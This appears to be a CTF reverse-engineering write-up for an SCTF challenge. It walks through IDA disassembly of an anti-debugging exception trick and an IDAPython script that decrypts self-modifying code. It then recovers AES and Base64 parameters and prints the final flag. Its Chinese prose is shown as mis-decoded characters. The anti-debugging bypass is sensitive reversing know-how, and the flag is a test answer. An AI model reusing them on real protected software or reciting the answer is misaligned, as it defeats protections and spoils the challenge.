<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">00407B</span>58 stru_407B58     dd <span class="number">0F</span>FFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>58                                         ; DATA XREF: sub_402320+<span class="number">5</span>â†‘o</span><br><span class="line">.rdata:<span class="number">00407B</span>5C                 dd <span class="number">0</span>                    ; GSCookieXOROffset ; FILTER</span><br><span class="line">.rdata:<span class="number">00407B</span>60                 dd <span class="number">0F</span>FFFFFC4h           ; EHCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>64                 dd <span class="number">0</span>                    ; EHCookieXOROffset</span><br><span class="line">.rdata:<span class="number">00407B</span>68                 dd <span class="number">0F</span>FFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:<span class="number">00407B</span>6C                 dd offset loc_4023DC    ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:<span class="number">00407B</span>70                 dd offset loc_4023EF    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure>

<p>IDAå·²ç»æ³¨é‡Šæ¸…æ¥šäº† å¯¹åº”æŸ¥çœ‹FILTER å’Œ HANDLER</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">004023</span>DC loc_4023DC:                             ; DATA XREF: .rdata:stru_407B58â†“o</span><br><span class="line">.text:<span class="number">004023</span>DC                 mov     eax, [ebp+ms_exc.exc_ptr] ; FILTER</span><br><span class="line">.text:<span class="number">004023</span>DF                 mov     eax, [eax]</span><br><span class="line">.text:<span class="number">004023E1</span>                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">004023E3</span>                 cmp     dword ptr [eax], <span class="number">80000003</span>h ; æ–­ç‚¹å¼‚å¸¸</span><br><span class="line">.text:<span class="number">004023E9</span>                 setz    cl</span><br><span class="line">.text:<span class="number">004023</span>EC                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">004023</span>EE                 retn</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡æŸ¥å€¼å‘ç°FILTERçš„æ˜¯ä¸€ä¸ªæ–­ç‚¹å¼‚å¸¸<br>æŸ¥çœ‹ HANDLER</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">004023</span>EF loc_4023EF:                             ; DATA XREF: .rdata:stru_407B58â†“o</span><br><span class="line">.text:<span class="number">004023</span>EF                 mov     esp, [ebp+ms_exc.old_esp] ; HANDLER_FUNCTION</span><br><span class="line">.text:<span class="number">004023F</span>2                 lea     eax, [ebp+pbDebuggerPresent]</span><br><span class="line">.text:<span class="number">004023F</span>5                 push    eax             ; pbDebuggerPresent</span><br><span class="line">.text:<span class="number">004023F</span>6                 call    ds:GetCurrentProcess</span><br><span class="line">.text:<span class="number">004023F</span>C                 push    eax             ; hProcess</span><br><span class="line">.text:<span class="number">004023F</span>D                 call    ds:CheckRemoteDebuggerPresent</span><br><span class="line">.text:<span class="number">00402403</span>                 call    ds:IsDebuggerPresent</span><br><span class="line">.text:<span class="number">00402409</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">0040240B</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">0040240</span>D                 cmp     [ebp+pbDebuggerPresent], eax</span><br><span class="line">.text:<span class="number">00402410</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">00402412</span>                 mov     eax, [ebp+var_24]</span><br><span class="line">.text:<span class="number">00402415</span>                 mov     edx, [eax+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">00402418</span>                 mov     ecx, [eax+<span class="number">0</span>Ch]</span><br><span class="line">.text:<span class="number">0040241B</span>                 add     ecx, [ebp+var_28]</span><br><span class="line">.text:<span class="number">0040241</span>E                 mov     esi, [ebp+var_2C]</span><br><span class="line">.text:<span class="number">00402421</span>                 lea     edi, [esi+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">00402424</span></span><br><span class="line">.text:<span class="number">00402424</span> loc_402424:                             ; CODE XREF: sub_402320+<span class="number">109</span>â†“j</span><br><span class="line">.text:<span class="number">00402424</span>                 mov     al, [esi]</span><br><span class="line">.text:<span class="number">00402426</span>                 inc     esi</span><br><span class="line">.text:<span class="number">00402427</span>                 test    al, al</span><br><span class="line">.text:<span class="number">00402429</span>                 jnz     <span class="type">short</span> loc_402424</span><br><span class="line">.text:<span class="number">0040242B</span>                 sub     esi, edi</span><br><span class="line">.text:<span class="number">0040242</span>D                 push    esi</span><br><span class="line">.text:<span class="number">0040242</span>E                 push    ecx</span><br><span class="line">.text:<span class="number">0040242F</span>                 call    sub_402450      ; !!!</span><br><span class="line">.text:<span class="number">00402434</span>                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00402437</span>                 jmp     <span class="type">short</span> loc_4023B9</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç»è¿‡ä¸€ç³»åˆ—åè°ƒè¯•æ£€æµ‹å è°ƒç”¨äº†sub_402450å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_402450</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = aSycloversyclov[v7++];               <span class="comment">// sycloversyclover</span></span><br><span class="line">      *(_BYTE *)(result + a1) = ~(*(_BYTE *)(result + a1) ^ v8);</span><br><span class="line">      ++result;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= a4 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹main é¦–å…ˆè°ƒç”¨äº†</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __thiscall <span class="title">sub_402320</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 v2; <span class="comment">// bx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>[<span class="number">15</span>];</span><br><span class="line">  v2 = *(_WORD *)((<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">6</span>);</span><br><span class="line">  v3 = (<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">248</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strcmp</span>(v3, <span class="string">&quot;.SCTF&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">DebugBreak</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 += <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒDebugBreak()å°±æ˜¯è§¦å‘æ–­ç‚¹å¼‚å¸¸ï¼<br>è¿™é‡Œv5æ˜¯strcmpçš„å€¼ ä¹Ÿå°±æ˜¯å½“v3&#x3D;&#x3D;.SCTFæ—¶ ä¼šè§¦å‘è¿™ä¸ªå¼‚å¸¸<br>çŒœæµ‹è¿™é‡Œ.SCTFæ˜¯è‡ªå¸¦çš„ä»£ç èŠ‚åŒºæ®µ<br>ç»§ç»­åˆ†æ</p>
<p>æ¥ä¸‹æ¥ç¨‹åºè°ƒç”¨äº†sub_404000 è·Ÿè¸ªå‘ç°æ˜¯ä¸€æ®µè¢«åŠ å¯†çš„ä»£ç æ®µ è€Œä¸”æ­£æ˜¯ .SCTF<br>æ‰€ä»¥sub_402450å‡½æ•°æ˜¯SMCçš„è§£å¯†ä»£ç <br>æˆ‘ä»¬ä¹Ÿç›´æ¥ida_python è§£å¯†åç¼–è¯‘æˆå‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addstr = <span class="number">0x404000</span> </span><br><span class="line">addend = <span class="number">0x405000</span> </span><br><span class="line">key = <span class="string">&quot;sycloversyclover&quot;</span> </span><br><span class="line">j = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(addstr,addend,<span class="number">1</span>): </span><br><span class="line">  data = (~(idc.get_wide_byte(i) ^ <span class="built_in">ord</span>(key[j%<span class="built_in">len</span>(key)]))&amp;<span class="number">0xff</span>) </span><br><span class="line">  ida_bytes.patch_byte(i,data) </span><br><span class="line">  j += <span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sub_404000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">0x409017</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹å­—ç¬¦ä¸²ä½œäº†ä¸ªå˜æ¢<br>æœ¬æ¥åº”è¯¥æ˜¯å¯ä»¥C++æ¨¡æ‹Ÿè·‘ä¸€ä¸‹å‡ºç»“æœ ä½†æœ¬åœ°å‡ºäº†ç‚¹bug ç›´æ¥æŠŠå‰é¢çš„åè°ƒè¯•patchæ‰ è®©ç¨‹åºè¿è¡Œä¸€é<br>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</span><br></pre></td></tr></table></figure>

<p>ç»“åˆFindCryptæ’ä»¶çš„åˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Address	Rules file	Name	String	Value</span><br><span class="line">.rdata:004059E0	global	RijnDael_AES_4059E0	$c0	b&#x27;\xa5cc\xc6\x84||\xf8&#x27;</span><br><span class="line">.rdata:00405DE0	global	RijnDael_AES_CHAR_405DE0	$c0	b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00405DE0	global	RijnDael_AES_LONG_405DE0	$c0	b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00407390	global	BASE64_table_407390	$c0	b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨äº†AESå’ŒBase64<br>æ€ä¹ˆæ‰¾åˆ°å“ªäº›æ˜¯åŠ å¯†å‡½æ•°å‘¢ï¼Ÿ<br>åˆ†æmain<br>å”¯ä¸€å¯èƒ½æœ‰åŠ å¯†çš„åœ°æ–¹åœ¨è¿™</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_4020D0</span>(Block, (<span class="type">int</span>)v23);</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›<br>åœ¨é‡Œé¢çš„sub_401690å‡½æ•°ä¸­æ‰¾åˆ°äº†AES<br>å‡ ä¸ªå…³é”®å¤„</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">*(_OWORD *)(<span class="keyword">this</span> + <span class="number">980</span>) = xmmword_407360;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *)(<span class="keyword">this</span> + <span class="number">1012</span>), &amp;xmmword_407360, *(_DWORD *)(<span class="keyword">this</span> + <span class="number">972</span>));</span><br><span class="line">...</span><br><span class="line">v16 = <span class="string">&quot;sycloversyclover&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°xmmwordçš„å€¼ <code>66746373667463736674637366746373h</code><br>å…¶å®å°±æ˜¯ <code>ftcsftcsftcsftcs</code><br>æ³¨æ„ç«¯åºé—®é¢˜ è½¬ä¸€ä¸‹å¾—åˆ° <code>sctfsctfsctfsctf</code><br>æ‰¾<a href="https://www.toolhelper.cn/SymmetricEncryption/AES" target="_blank">åœ¨çº¿ç½‘ç«™</a>è§£ä¸€è§£</p>
<p><img src="https://s2.loli.net/2023/12/11/4D8V1fKISmkTG6O.png" alt="img"></p>
<p>æœ€åflag : sctf{Ae3_C8c_I28_pKcs79ad4}</p>
<hr>
<hr>
<p>è¿™é¢˜ç‹¬ç«‹åšçœŸçš„å¤Ÿå‘›çš„ ç›®å‰åªæ˜¯åœ¨åšé¢˜çš„è§’åº¦æŠ•æœºå–å·§çš„è§£å‡ºflag è¦å®Œå…¨å¼„æ˜ç™½è¿˜å¾—ç»§ç»­ç»ƒ</p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
</search>
